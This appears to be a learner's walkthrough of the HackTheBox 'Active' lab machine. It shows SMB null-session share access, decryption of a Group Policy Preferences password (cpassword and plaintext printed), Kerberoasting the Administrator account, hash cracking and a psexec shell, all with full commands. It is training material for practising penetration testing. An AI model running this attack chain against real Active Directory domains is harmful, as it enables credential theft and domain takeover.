---
title: "HackTheBox Active Walkthrough"
machine_name: "Active"
difficulty: "Easy"
os: "Windows"
date_completed: "2025-01-19"
techniques: ["Active Directory", "SMB Null Session", "Group Policy Preferences", "GPP Decrypt", "Kerberoasting", "SPN Enumeration", "RPC Enumeration"]
box_ip: "10.10.10.100"
machine_rank: "#172"
htb_completion_image: "active.webp"
---

As part of my continuous journey in cybersecurity, I recently tackled the "Active" machine on HackTheBox. This Windows-based challenge provided an excellent opportunity to explore Active Directory security concepts and common misconfigurations. In this write-up, I'll share my approach, the techniques I used, and the valuable lessons learned along the way.

## Box Information
- **Platform:** HackTheBox
- **Operating System:** Windows Server 2008 R2
- **Domain:** active.htb
- **Date Completed:** January 19, 2025

## Initial Reconnaissance

The first step in any penetration test is thorough enumeration. A port scan revealed several open ports typical of a Windows Domain Controller:

### Open Ports and Services

```bash
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
```

The presence of these services, particularly Kerberos and LDAP, immediately indicated we were dealing with an Active Directory environment. This guided my initial approach toward AD-specific enumeration techniques.

## The Path to Initial Access

### SMB Enumeration

My first breakthrough came from SMB enumeration. Using CrackMapExec, I discovered an accessible share named "Replication":

```bash
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```

This finding exemplifies why checking for null authentication is crucial in initial enumeration — even well-protected systems might have overlooked sharing permissions.

### Initial Discovery Attempts

#### DNS
For DNS enumeration I tried some simple dig commands to see if Zone Transfers were available and other techniques I learned from the HTB Academy on DNS enumeration. But I quickly realized that DNS had nothing to offer.

#### RPC
Knowing that I was dealing with an Active Directory environment, I tried to see if I had access to the domain users and other information that RPC allows you to query. But anonymous attempts were in vain.

### Leveraging Group Policy Preferences (GPP)

Within the Replication share, I discovered a **Groups.xml** file. This was a significant finding because it highlighted a critical security misconfiguration in Windows Server 2008 R2 systems. Before Microsoft's MS14-025 patch, Group Policy Preferences could store encrypted credentials in SYSVOL — accessible to all domain users.

SMB null auth reveals a share we can enter `Replication`. There are lots of files in the share, I chose to do a recursive list of all of the files on the share to manually look for some interesting files. I instantly saw the `Groups.xml` file. Occasionally xml files contain useful information. This file in particular contains a username and encrypted password.

The encrypted password was easily decrypted using gpp-decrypt:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

# Result: GPPstillStandingStrong2k18
```

This gave me credentials for a service account (**SVC_TGS**), demonstrating why proper credential management and regular security patches are crucial in Active Directory environments.

## Post-Exploitation and Privilege Escalation

### Enumeration with Credentials

With valid credentials, I moved to deeper enumeration using tools like rpcclient to understand the domain structure:

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
```

At this point I would normally attempt to use Evil-WinRM to get a shell on the machine, but this time the port was not open, meaning I had to enumerate in a different manner. Knowing that these boxes usually fall back on the Impacket scripts for privilege escalation I started looking at some of the scripts I could use to get more information.

### Kerberoasting Attack

The critical finding came from discovering a Service Principal Name (SPN) associated with the Administrator account. This allowed for a Kerberoasting attack:

```bash
python3 GetUsersSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```

This will give us the hash for the Administrator user, using Hashcat, we can crack it and get the password:

```bash
hashcat -m 13100 <hash> <wordlist>
```

After cracking the obtained hash with Hashcat, I had Administrator credentials, allowing full domain compromise through psexec.py:

```bash
python3 psexec.py active.htb/Administrator@10.10.10.100
```

After running this command we have a shell and can get the root flag.

## Key Learning Points

### Technical Skills Gained

#### Reverse DNS Lookup Enumeration Improvements
From Ippsec's walkthrough, I learned that he constantly leverages the `nslookup` tool to perform reverse DNS lookups on the server in order to gain more information about the target host.

```bash
nslookup
> server <targetIP>
> 127.0.0.1
> <targetIP>
```

#### SMBMap Improved Usage
We can use SMBMap to recursively go through an entire share so we can see what's inside faster instead of manually going through the directories:

```bash
smbmap -R <ShareName> -H 10.10.10.100
smbmap -R <ShareName> -H 10.10.10.100 -A Groups.xml -q
```

#### GPP Policies and Files for Windows <12
This box is a Windows 2008 machine with different default settings for Active Directory. Before Microsoft's MS14-025 patch, administrators could create group policies that would store credentials for user account policies or network drive mappings.

**Formal Explanation:** For Windows Server 2012 R2 and previous, before MS14-025 patch, a scenario exists where Administrators could create group policies that would store credentials in the `Groups.xml` policy file in SYSVOL, accessible to all domain users. The AES-32bit key for this was disclosed publicly, allowing attackers to decrypt passwords with publicly available tools.

#### Alternative Access Methods
When Evil-WinRM isn't available, using alternatives like `runas /netonly` for Windows authentication:

```bash
runas /netonly /user:active.htb\svc_tgs cmd
```

### Methodology Improvements
- **GPP Vulnerability Understanding:** Historical vulnerabilities like MS14-025 are crucial for security professionals working with legacy systems
- **Enumeration Techniques:** Improved enumeration with advanced nslookup usage, efficient SMB share enumeration with smbmap and smbclient, and comprehensive domain enumeration using Impacket tools
- **Impacket Scripts:** If I find myself working on an Active Directory environment and manage to get first user credentials, I should instantly shift to the Impacket scripts for domain enumeration

### Personal Growth Notes
- Writing walkthroughs in constant "improvement" mentality has been quite beneficial
- I'm starting to form a solid enumeration methodology for Active Directory machines
- Understanding the basics of attacking these types of machines is becoming clearer

## Attack Chain Summary

1. Initial SMB null session reveals accessible Replication share
2. Groups.xml discovery in SYSVOL contains encrypted GPP password
3. GPP password decrypt yields SVC_TGS credentials
4. SVC_TGS credential access enables domain enumeration
5. Kerberoasting Administrator account via SPN discovery
6. System access achieved via psexec.py with cracked Administrator credentials

This HTB challenge exemplifies why understanding Active Directory security is crucial for modern cybersecurity professionals. It demonstrates how misconfigurations, legacy vulnerabilities, and improper credential management can lead to complete domain compromise.
